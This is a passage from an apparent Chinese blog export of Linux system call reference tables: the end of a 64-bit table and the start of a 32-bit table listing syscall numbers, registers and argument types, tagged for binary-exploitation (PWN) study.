| <font style=\"color:#4f4f4f;\">unsigned long nr_segs</font> | <font style=\"color:#4f4f4f;\">unsigned int flags</font> | | |\n| <font style=\"color:#4f4f4f;\">279.</font> | <font style=\"color:#4f4f4f;\">sys_move_pages</font> | <font style=\"color:#4f4f4f;\">279.</font> | <font style=\"color:#4f4f4f;\">pid_t pid</font> | <font style=\"color:#4f4f4f;\">unsigned long nr_pages</font> | <font style=\"color:#4f4f4f;\">const void **pages</font> | <font style=\"color:#4f4f4f;\">const int *nodes</font> | <font style=\"color:#4f4f4f;\">int *status</font> | <font style=\"color:#4f4f4f;\">int flags</font> |\n| <font style=\"color:#4f4f4f;\">280.</font> | <font style=\"color:#4f4f4f;\">sys_utimensat</font> | <font style=\"color:#4f4f4f;\">280.</font> | <font style=\"color:#4f4f4f;\">int dfd</font> | <font style=\"color:#4f4f4f;\">const char *filename</font> | <font style=\"color:#4f4f4f;\">struct timespec *utimes</font> | <font style=\"color:#4f4f4f;\">int flags</font> | | |\n| <font style=\"color:#4f4f4f;\">281.</font> | <font style=\"color:#4f4f4f;\">sys_epoll_pwait</font> | <font style=\"color:#4f4f4f;\">281.</font> | <font style=\"color:#4f4f4f;\">int epfd</font> | <font style=\"color:#4f4f4f;\">struct epoll_event *events</font> | <font style=\"color:#4f4f4f;\">int maxevents</font> | <font style=\"color:#4f4f4f;\">int timeout</font> | <font style=\"color:#4f4f4f;\">const sigset_t *sigmask</font> | <font style=\"color:#4f4f4f;\">size_t sigsetsize</font> |\n| <font style=\"color:#4f4f4f;\">282.</font> | <font style=\"color:#4f4f4f;\">sys_signalfd</font> | <font style=\"color:#4f4f4f;\">282.</font> | <font style=\"color:#4f4f4f;\">int ufd</font> | <font style=\"color:#4f4f4f;\">sigset_t *user_mask</font> | <font style=\"color:#4f4f4f;\">size_t sizemask</font> | | | |\n| <font style=\"color:#4f4f4f;\">283.</font> | <font style=\"color:#4f4f4f;\">sys_timerfd_create</font> | <font style=\"color:#4f4f4f;\">283.</font> | <font style=\"color:#4f4f4f;\">int clockid</font> | <font style=\"color:#4f4f4f;\">int flags</font> | | | | |\n| <font style=\"color:#4f4f4f;\">284.</font> | <font style=\"color:#4f4f4f;\">sys_eventfd</font> | <font style=\"color:#4f4f4f;\">284.</font> | <font style=\"color:#4f4f4f;\">unsigned int count</font> | | | | | |\n| <font style=\"color:#4f4f4f;\">285.</font> | <font style=\"color:#4f4f4f;\">sys_fallocate</font> | <font style=\"color:#4f4f4f;\">285.</font> | <font style=\"color:#4f4f4f;\">long fd</font> | <font style=\"color:#4f4f4f;\">long mode</font> | <font style=\"color:#4f4f4f;\">loff_t offset</font> | <font style=\"color:#4f4f4f;\">loff_t len</font> | | |\n| <font style=\"color:#4f4f4f;\">286.</font> | <font style=\"color:#4f4f4f;\">sys_timerfd_settime</font> | <font style=\"color:#4f4f4f;\">286.</font> | <font style=\"color:#4f4f4f;\">int ufd</font> | <font style=\"color:#4f4f4f;\">int flags</font> | <font style=\"color:#4f4f4f;\">const struct itimerspec *utmr</font> | <font style=\"color:#4f4f4f;\">struct itimerspec *otmr</font> | | |\n| <font style=\"color:#4f4f4f;\">287.</font> | <font style=\"color:#4f4f4f;\">sys_timerfd_gettime</font> | <font style=\"color:#4f4f4f;\">287.</font> | <font style=\"color:#4f4f4f;\">int ufd</font> | <font style=\"color:#4f4f4f;\">struct itimerspec *otmr</font> | | | | |\n| <font style=\"color:#4f4f4f;\">288.</font> | <font style=\"color:#4f4f4f;\">sys_accept4</font> | <font style=\"color:#4f4f4f;\">288.</font> | <font style=\"color:#4f4f4f;\">int fd</font> | <font style=\"color:#4f4f4f;\">struct sockaddr *upeer_sockaddr</font> | <font style=\"color:#4f4f4f;\">int *upeer_addrlen</font> | <font style=\"color:#4f4f4f;\">int flags</font> | | |\n| <font style=\"color:#4f4f4f;\">289.</font> | <font style=\"color:#4f4f4f;\">sys_signalfd4</font> | <font style=\"color:#4f4f4f;\">289.</font> | <font style=\"color:#4f4f4f;\">int ufd</font> | <font style=\"color:#4f4f4f;\">sigset_t *user_mask</font> | <font style=\"color:#4f4f4f;\">size_t sizemask</font> | <font style=\"color:#4f4f4f;\">int flags</font> | | |\n| <font style=\"color:#4f4f4f;\">290.</font> | <font style=\"color:#4f4f4f;\">sys_eventfd2</font> | <font style=\"color:#4f4f4f;\">290.</font> | <font style=\"color:#4f4f4f;\">unsigned int count</font> | <font style=\"color:#4f4f4f;\">int flags</font> | | | | |\n| <font style=\"color:#4f4f4f;\">291.</font> | <font style=\"color:#4f4f4f;\">sys_epoll_create1</font> | <font style=\"color:#4f4f4f;\">291.</font> | <font style=\"color:#4f4f4f;\">int flags</font> | | | | | |\n| <font style=\"color:#4f4f4f;\">292.</font> | <font style=\"color:#4f4f4f;\">sys_dup3</font> | <font style=\"color:#4f4f4f;\">292.</font> | <font style=\"color:#4f4f4f;\">unsigned int oldfd</font> | <font style=\"color:#4f4f4f;\">unsigned int newfd</font> | <font style=\"color:#4f4f4f;\">int flags</font> | | | |\n| <font style=\"color:#4f4f4f;\">293.</font> | <font style=\"color:#4f4f4f;\">sys_pipe2</font> | <font style=\"color:#4f4f4f;\">293.</font> | <font style=\"color:#4f4f4f;\">int *filedes</font> | <font style=\"color:#4f4f4f;\">int flags</font> | | | | |\n| <font style=\"color:#4f4f4f;\">294.</font> | <font style=\"color:#4f4f4f;\">sys_inotify_init1</font> | <font style=\"color:#4f4f4f;\">294.</font> | <font style=\"color:#4f4f4f;\">int flags</font> | | | | | |\n| <font style=\"color:#4f4f4f;\">295.</font> | <font style=\"color:#4f4f4f;\">sys_preadv</font> | <font style=\"color:#4f4f4f;\">295.</font> | <font style=\"color:#4f4f4f;\">unsigned long fd</font> | <font style=\"color:#4f4f4f;\">const struct iovec *vec</font> | <font style=\"color:#4f4f4f;\">unsigned long vlen</font> | <font style=\"color:#4f4f4f;\">unsigned long pos_l</font> | <font style=\"color:#4f4f4f;\">unsigned long pos_h</font> | |\n| <font style=\"color:#4f4f4f;\">296.</font> | <font style=\"color:#4f4f4f;\">sys_pwritev</font> | <font style=\"color:#4f4f4f;\">296.</font> | <font style=\"color:#4f4f4f;\">unsigned long fd</font> | <font style=\"color:#4f4f4f;\">const struct iovec *vec</font> | <font style=\"color:#4f4f4f;\">unsigned long vlen</font> | <font style=\"color:#4f4f4f;\">unsigned long pos_l</font> | <font style=\"color:#4f4f4f;\">unsigned long pos_h</font> | |\n| <font style=\"color:#4f4f4f;\">297.</font> | <font style=\"color:#4f4f4f;\">sys_rt_tgsigqueueinfo</font> | <font style=\"color:#4f4f4f;\">297.</font> | <font style=\"color:#4f4f4f;\">pid_t tgid</font> | <font style=\"color:#4f4f4f;\">pid_t pid</font> | <font style=\"color:#4f4f4f;\">int sig</font> | <font style=\"color:#4f4f4f;\">siginfo_t *uinfo</font> | | |\n| <font style=\"color:#4f4f4f;\">298.</font> | <font style=\"color:#4f4f4f;\">sys_perf_event_open</font> | <font style=\"color:#4f4f4f;\">298.</font> | <font style=\"color:#4f4f4f;\">struct perf_event_attr *attr_uptr</font> | <font style=\"color:#4f4f4f;\">pid_t pid</font> | <font style=\"color:#4f4f4f;\">int cpu</font> | <font style=\"color:#4f4f4f;\">int group_fd</font> | <font style=\"color:#4f4f4f;\">unsigned long flags</font> | |\n| <font style=\"color:#4f4f4f;\">299.</font> | <font style=\"color:#4f4f4f;\">sys_recvmmsg</font> | <font style=\"color:#4f4f4f;\">299.</font> | <font style=\"color:#4f4f4f;\">int fd</font> | <font style=\"color:#4f4f4f;\">struct msghdr *mmsg</font> | <font style=\"color:#4f4f4f;\">unsigned int vlen</font> | <font style=\"color:#4f4f4f;\">unsigned int flags</font> | <font style=\"color:#4f4f4f;\">struct timespec *timeout</font> | |\n| <font style=\"color:#4f4f4f;\">300.</font> | <font style=\"color:#4f4f4f;\">sys_fanotify_init</font> | <font style=\"color:#4f4f4f;\">300.</font> | <font style=\"color:#4f4f4f;\">unsigned int flags</font> | <font style=\"color:#4f4f4f;\">unsigned int event_f_flags</font> | | | | |\n| <font style=\"color:#4f4f4f;\">301.</font> | <font style=\"color:#4f4f4f;\">sys_fanotify_mark</font> | <font style=\"color:#4f4f4f;\">301.</font> | <font style=\"color:#4f4f4f;\">long fanotify_fd</font> | <font style=\"color:#4f4f4f;\">long flags</font> | <font style=\"color:#4f4f4f;\">__u64 mask</font> | <font style=\"color:#4f4f4f;\">long dfd</font> | <font style=\"color:#4f4f4f;\">long pathname</font> | |\n| <font style=\"color:#4f4f4f;\">302.</font> | <font style=\"color:#4f4f4f;\">sys_prlimit64</font> | <font style=\"color:#4f4f4f;\">302.</font> | <font style=\"color:#4f4f4f;\">pid_t pid</font> | <font style=\"color:#4f4f4f;\">unsigned int resource</font> | <font style=\"color:#4f4f4f;\">const struct rlimit64 *new_rlim</font> | <font style=\"color:#4f4f4f;\">struct rlimit64 *old_rlim</font> | | |\n| <font style=\"color:#4f4f4f;\">303.</font> | <font style=\"color:#4f4f4f;\">sys_name_to_handle_at</font> | <font style=\"color:#4f4f4f;\">303.</font> | <font style=\"color:#4f4f4f;\">int dfd</font> | <font style=\"color:#4f4f4f;\">const char *name</font> | <font style=\"color:#4f4f4f;\">struct file_handle *handle</font> | <font style=\"color:#4f4f4f;\">int *mnt_id</font> | <font style=\"color:#4f4f4f;\">int flag</font> | |\n| <font style=\"color:#4f4f4f;\">304.</font> | <font style=\"color:#4f4f4f;\">sys_open_by_handle_at</font> | <font style=\"color:#4f4f4f;\">304.</font> | <font style=\"color:#4f4f4f;\">int dfd</font> | <font style=\"color:#4f4f4f;\">const char *name</font> | <font style=\"color:#4f4f4f;\">struct file_handle *handle</font> | <font style=\"color:#4f4f4f;\">int *mnt_id</font> | <font style=\"color:#4f4f4f;\">int flags</font> | |\n| <font style=\"color:#4f4f4f;\">305.</font> | <font style=\"color:#4f4f4f;\">sys_clock_adjtime</font> | <font style=\"color:#4f4f4f;\">305.</font> | <font style=\"color:#4f4f4f;\">clockid_t which_clock</font> | <font style=\"color:#4f4f4f;\">struct timex *tx</font> | | | | |\n| <font style=\"color:#4f4f4f;\">306.</font> | <font style=\"color:#4f4f4f;\">sys_syncfs</font> | <font style=\"color:#4f4f4f;\">306.</font> | <font style=\"color:#4f4f4f;\">int fd</font> | | | | | |\n| <font style=\"color:#4f4f4f;\">307.</font> | <font style=\"color:#4f4f4f;\">sys_sendmmsg</font> | <font style=\"color:#4f4f4f;\">307.</font> | <font style=\"color:#4f4f4f;\">int fd</font> | <font style=\"color:#4f4f4f;\">struct mmsghdr *mmsg</font> | <font style=\"color:#4f4f4f;\">unsigned int vlen</font> | <font style=\"color:#4f4f4f;\">unsigned int flags</font> | | |\n| <font style=\"color:#4f4f4f;\">308.</font> | <font style=\"color:#4f4f4f;\">sys_setns</font> | <font style=\"color:#4f4f4f;\">308.</font> | <font style=\"color:#4f4f4f;\">int fd</font> | <font style=\"color:#4f4f4f;\">int nstype</font> | | | | |\n| <font style=\"color:#4f4f4f;\">309.</font> | <font style=\"color:#4f4f4f;\">sys_getcpu</font> | <font style=\"color:#4f4f4f;\">309.</font> | <font style=\"color:#4f4f4f;\">unsigned *cpup</font> | <font style=\"color:#4f4f4f;\">unsigned *nodep</font> | <font style=\"color:#4f4f4f;\">struct getcpu_cache *unused</font> | | | |\n| <font style=\"color:#4f4f4f;\">310.</font> | <font style=\"color:#4f4f4f;\">sys_process_vm_readv</font> | <font style=\"color:#4f4f4f;\">310.</font> | <font style=\"color:#4f4f4f;\">pid_t pid</font> | <font style=\"color:#4f4f4f;\">const struct iovec *lvec</font> | <font style=\"color:#4f4f4f;\">unsigned long liovcnt</font> | <font style=\"color:#4f4f4f;\">const struct iovec *rvec</font> | <font style=\"color:#4f4f4f;\">unsigned long riovcnt</font> | <font style=\"color:#4f4f4f;\">unsigned long flags</font> |\n| <font style=\"color:#4f4f4f;\">311.</font> | <font style=\"color:#4f4f4f;\">sys_process_vm_writev</font> | <font style=\"color:#4f4f4f;\">311.</font> | <font style=\"color:#4f4f4f;\">pid_t pid</font> | <font style=\"color:#4f4f4f;\">const struct iovec *lvec</font> | <font style=\"color:#4f4f4f;\">unsigned long liovcnt</font> | <font style=\"color:#4f4f4f;\">const struct iovcc *rvec</font> | <font style=\"color:#4f4f4f;\">unsigned long riovcnt</font> | <font style=\"color:#4f4f4f;\">unsigned long flags</font> |\n\n\n","tags":["PWN攻略-所需表格","计算机原理相关表格"],"categories":["PWN不出来"]},{"title":"syscall调用表32位","url":"//docx/syscall调用表32位/","content":"| **<font style=\"color:#4f4f4f;\">Num</font>** | **<font style=\"color:#4f4f4f;\">syscall</font>** | **<font style=\"color:#4f4f4f;\">%eax</font>** | **<font style=\"color:#4f4f4f;\">arg0 (%ebx)</font>** | **<font style=\"color:#4f4f4f;\">arg1 (%ecx)</font>** | **<font style=\"color:#4f4f4f;\">arg2 (%edx)</font>** | **<font style=\"color:#4f4f4f;\">arg3 (%esi)</font>** | **<font style=\"color:#4f4f4f;\">arg4 (%edi)</font>** | **<font style=\"color:#4f4f4f;\">arg5 (%ebp)</font>** |\n| :---: | :---: | :---: | :---: | :---: | :---: | :---: | :---: | :---: |\n| <font style=\"color:#4f4f4f;\">0.</font> | <font style=\"color:#4f4f4f;\">restart_syscall</font> | <font style=\"color:#4f4f4f;\">0.</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">1.</font> | <font style=\"color:#4f4f4f;\">exit</font> | <font style=\"color:#4f4f4f;\">1.</font> | <font style=\"color:#4f4f4f;\">int error_code</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">2.</font> | <font style=\"color:#4f4f4f;\">fork</font> | <font style=\"color:#4f4f4f;\">2.</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">3.</font> | <font style=\"color:#4f4f4f;\">read</font> | <font style=\"color:#4f4f4f;\">3.</font> | <font style=\"color:#4f4f4f;\">unsigned int fd</font> | <font style=\"color:#4f4f4f;\">char *buf</font> | <font style=\"color:#4f4f4f;\">size_t count</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">4.</font> | <font style=\"color:#4f4f4f;\">write</font> | <font style=\"color:#4f4f4f;\">4.</font> | <font style=\"color:#4f4f4f;\">unsigned int fd</font> | <font style=\"color:#4f4f4f;\">const char *buf</font> | <font style=\"color:#4f4f4f;\">size_t count</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">5.</font> | <font style=\"color:#4f4f4f;\">open</font> | <font style=\"color:#4f4f4f;\">5.</font> | <font style=\"color:#4f4f4f;\">const char *filename</font> | <font style=\"color:#4f4f4f;\">int flags</font> | <font style=\"color:#4f4f4f;\">umode_t mode</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">6.</font> | <font style=\"color:#4f4f4f;\">close</font> | <font style=\"color:#4f4f4f;\">6.</font> | <font style=\"color:#4f4f4f;\">unsigned int fd</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">7.</font> | <font style=\"color:#4f4f4f;\">waitpid</font> | <font style=\"color:#4f4f4f;\">7.</font> | <font style=\"color:#4f4f4f;\">pid_t pid</font> | <font style=\"color:#4f4f4f;\">int *stat_addr</font> | <font style=\"color:#4f4f4f;\">int options</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">8.</font> | <font style=\"color:#4f4f4f;\">creat</font> | <font style=\"color:#4f4f4f;\">8.</font> | <font style=\"color:#4f4f4f;\">const char *pathname</font> | <font style=\"color:#4f4f4f;\">umode_t mode</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">9.</font> | <font style=\"color:#4f4f4f;\">link</font> | <font style=\"color:#4f4f4f;\">9.</font> | <font style=\"color:#4f4f4f;\">const char *oldname</font> | <font style=\"color:#4f4f4f;\">const char *newname</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">10.</font> | <font style=\"color:#4f4f4f;\">unlink</font> | <font style=\"color:#4f4f4f;\">10.</font> | <font style=\"color:#4f4f4f;\">const char *pathname</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">11.</font> | <font style=\"color:#4f4f4f;\">execve</font> | <font style=\"color:#4f4f4f;\">11.</font> | <font style=\"color:#4f4f4f;\">const char *filename</font> | <font style=\"color:#4f4f4f;\">const char *const *argv</font> | <font style=\"color:#4f4f4f;\">const char *const *envp</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">12.</font> | <font style=\"color:#4f4f4f;\">chdir</font> | <font style=\"color:#4f4f4f;\">12.</font> | <font style=\"color:#4f4f4f;\">const char *filename</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">13.</font> | <font style=\"color:#4f4f4f;\">time</font> | <font style=\"color:#4f4f4f;\">13.</font> | <font style=\"color:#4f4f4f;\">time_t *tloc</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">14.</font> | <font style=\"color:#4f4f4f;\">mknod</font> | <font style=\"color:#4f4f4f;\">14.</font> | <font style=\"color:#4f4f4f;\">const char *filename</font> | <font style=\"color:#4f4f4f;\">umode_t mode</font> | <font style=\"color:#4f4f4f;\">unsigned dev</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">15.</font> | <font style=\"color:#4f4f4f;\">chmod</font> | <font style=\"color:#4f4f4f;\">15.</font> | <font style=\"color:#4f4f4f;\">const char *filename</font> | <font style=\"color:#4f4f4f;\">umode_t mode</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">16.</font> | <font style=\"color:#4f4f4f;\">lchown</font> | <font style=\"color:#4f4f4f;\">16.</font> | <font style=\"color:#4f4f4f;\">const char *filename</font> | <font style=\"color:#4f4f4f;\">uid_t user</font> | <font style=\"color:#4f4f4f;\">gid_t group</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">17.</font> | <font style=\"color:#4f4f4f;\">break</font> | <font style=\"color:#4f4f4f;\">17.</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> |\n| <font style=\"color:#4f4f4f;\">18.</font> | <font style=\"color:#4f4f4f;\">oldstat</font> | <font style=\"color:#4f4f4f;\">18.</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> |\n| <font style=\"color:#4f4f4f;\">19.</font> | <font style=\"color:#4f4f4f;\">lseek</font> | <font style=\"color:#4f4f4f;\">19.</font> | <font style=\"color:#4f4f4f;\">unsigned int fd</font> | <font style=\"color:#4f4f4f;\">off_t offset</font> | <font style=\"color:#4f4f4f;\">unsigned int whence</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">20.</font> | <font style=\"color:#4f4f4f;\">getpid</font> | <font style=\"color:#4f4f4f;\">20.</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">21.</font> | <font style=\"color:#4f4f4f;\">mount</font> | <font style=\"color:#4f4f4f;\">21.</font> | <font style=\"color:#4f4f4f;\">char *dev_name</font> | <font style=\"color:#4f4f4f;\">char *dir_name</font> | <font style=\"color:#4f4f4f;\">char *type</font> | <font style=\"color:#4f4f4f;\">unsigned long flags</font> | <font style=\"color:#4f4f4f;\">void *data</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">22.</font> | <font style=\"color:#4f4f4f;\">umount</font> | <font style=\"color:#4f4f4f;\">22.</font> | <font style=\"color:#4f4f4f;\">char *name</font> | <font style=\"color:#4f4f4f;\">int flags</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">23.</font> | <font style=\"color:#4f4f4f;\">setuid</font> | <font style=\"color:#4f4f4f;\">23.</font> | <font style=\"color:#4f4f4f;\">uid_t uid</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">24.</font> | <font style=\"color:#4f4f4f;\">getuid</font> | <font style=\"color:#4f4f4f;\">24.</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">25.</font> | <font style=\"color:#4f4f4f;\">stime</font> | <font style=\"color:#4f4f4f;\">25.</font> | <font style=\"color:#4f4f4f;\">time_t *tptr</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">26.</font> | <font style=\"color:#4f4f4f;\">ptrace</font> | <font style=\"color:#4f4f4f;\">26.</font> | <font style=\"color:#4f4f4f;\">long request</font> | <font style=\"color:#4f4f4f;\">long pid</font> | <font style=\"color:#4f4f4f;\">unsigned long addr</font> | <font style=\"color:#4f4f4f;\">unsigned long data</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">27.</font> | <font style=\"color:#4f4f4f;\">alarm</font> | <font style=\"color:#4f4f4f;\">27.</font> | <font style=\"color:#4f4f4f;\">unsigned int seconds</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">28.</font> | <font style=\"color:#4f4f4f;\">oldfstat</font> | <font style=\"color:#4f4f4f;\">28.</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> |\n| <font style=\"color:#4f4f4f;\">29.</font> | <font style=\"color:#4f4f4f;\">pause</font> | <font style=\"color:#4f4f4f;\">29.</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">30.</font> | <font style=\"color:#4f4f4f;\">utime</font> | <font style=\"color:#4f4f4f;\">30.</font> | <font style=\"color:#4f4f4f;\">char *filename</font> | <font style=\"color:#4f4f4f;\">struct utimbuf *times</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">31.</font> | <font style=\"color:#4f4f4f;\">stty</font> | <font style=\"color:#4f4f4f;\">31.</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> |\n| <font style=\"color:#4f4f4f;\">32.</font> | <font style=\"color:#4f4f4f;\">gtty</font> | <font style=\"color:#4f4f4f;\">32.</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> |\n| <font style=\"color:#4f4f4f;\">33.</font> | <font style=\"color:#4f4f4f;\">access</font> | <font style=\"color:#4f4f4f;\">33.</font> | <font style=\"color:#4f4f4f;\">const char *filename</font> | <font style=\"color:#4f4f4f;\">int mode</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">34.</font> | <font style=\"color:#4f4f4f;\">nice</font> | <font style=\"color:#4f4f4f;\">34.</font> | <font style=\"color:#4f4f4f;\">int increment</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">35.</font> | <font style=\"color:#4f4f4f;\">ftime</font> | <font style=\"color:#4f4f4f;\">35.</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> |\n| <font style=\"color:#4f4f4f;\">36.</font> | <font style=\"color:#4f4f4f;\">sync</font> | <font style=\"color:#4f4f4f;\">36.</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">37.</font> | <font style=\"color:#4f4f4f;\">kill</font> | <font style=\"color:#4f4f4f;\">37.</font> | <font style=\"color:#4f4f4f;\">pid_t pid</font> | <font style=\"color:#4f4f4f;\">int sig</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">38.</font> 